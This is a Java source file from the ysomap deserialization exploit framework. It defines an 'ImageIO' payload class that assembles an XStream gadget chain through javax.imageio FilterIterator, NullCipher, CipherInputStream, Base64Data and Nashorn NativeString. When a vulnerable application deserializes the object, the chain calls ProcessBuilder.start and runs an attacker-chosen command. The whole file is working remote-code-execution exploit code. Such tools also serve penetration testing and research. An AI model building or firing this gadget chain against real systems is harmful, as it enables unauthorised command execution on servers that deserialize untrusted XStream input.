package ysomap.core.payload.xstream;

import ysomap.common.annotation.Authors;
import ysomap.common.annotation.Dependencies;
import ysomap.common.annotation.Payloads;
import ysomap.common.annotation.Require;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Payload;
import ysomap.core.bullet.jdk.ProcessBuilderBullet;
import ysomap.core.serializer.Serializer;
import ysomap.core.serializer.SerializerFactory;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.NullCipher;
import javax.imageio.spi.ServiceRegistry;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.Collections;
import java.util.Iterator;

/**
 * @author wh1t3P1g
 * @since 2020/4/15
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.WH1T3P1G })
@Dependencies({"Gadget For XStream"})
@Require(bullets = {"ProcessBuilderBullet","JdbcRowSetImplBullet"})
public class ImageIO extends Payload<Object> {

    @Override
    public Serializer<?> getSerializer() {
        return SerializerFactory.createSerializer("xstream");
    }

    @Override
    public Bullet getDefaultBullet(String command) throws Exception {
        return new ProcessBuilderBullet().set("command",command);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        String action = bullet.get("action");
        if(action == null){
            action = "start";// 默认为ProcessBuilder的start函数
        }
        Class<?> clazz = obj.getClass();
        Method method = clazz.getMethod(action);
        ServiceRegistry.Filter filter =
                (ServiceRegistry.Filter) ReflectionHelper.newInstance(
                        "javax.imageio.ImageIO$ContainsFilter",
                        new Class<?>[]{Method.class, String.class},
                        new Object[]{ method, "foo"});
        Iterator it = makeFilterIterator(
                makeFilterIterator(Collections.emptyIterator(), obj, null),
                "foo",
                filter
        );

        return makeIteratorTriggerNative(it);
    }

    public static Iterator makeFilterIterator(Object iterator, Object first, Object filter) throws Exception {
        Iterator it = (Iterator) ReflectionHelper
                .createWithoutConstructor("javax.imageio.spi.FilterIterator");
        ReflectionHelper.setFieldValue(it, "iter", iterator);
        ReflectionHelper.setFieldValue(it, "next", first);
        ReflectionHelper.setFieldValue(it, "filter", filter);
        return it;
    }

    public static Object makeIteratorTriggerNative( Object it ) throws Exception {
        Cipher m = ReflectionHelper.createWithoutConstructor(NullCipher.class);
        ReflectionHelper.setFieldValue(m, "serviceIterator", it);
        ReflectionHelper.setFieldValue(m, "lock", new Object());

        InputStream cos = new CipherInputStream(null, m);

        Class<?> niCl = Class.forName("java.lang.ProcessBuilder$NullInputStream"); //$NON-NLS-1$
        Constructor<?> niCons = niCl.getDeclaredConstructor();
        niCons.setAccessible(true);

        ReflectionHelper.setFieldValue(cos, "input", niCons.newInstance());
        ReflectionHelper.setFieldValue(cos, "ibuffer", new byte[0]);

        Object b64Data = ReflectionHelper
                .createWithoutConstructor("com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data");
        DataSource ds = (DataSource) ReflectionHelper
                .createWithoutConstructor("com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"); //$NON-NLS-1$
        ReflectionHelper.setFieldValue(ds, "is", cos);
        ReflectionHelper.setFieldValue(b64Data, "dataHandler", new DataHandler(ds));
        ReflectionHelper.setFieldValue(b64Data, "data", null);

        Object nativeString = ReflectionHelper
                .createWithoutConstructor("jdk.nashorn.internal.objects.NativeString");
        ReflectionHelper.setFieldValue(nativeString, "value", b64Data);
        return PayloadHelper.makeMap(nativeString, nativeString);
    }
}
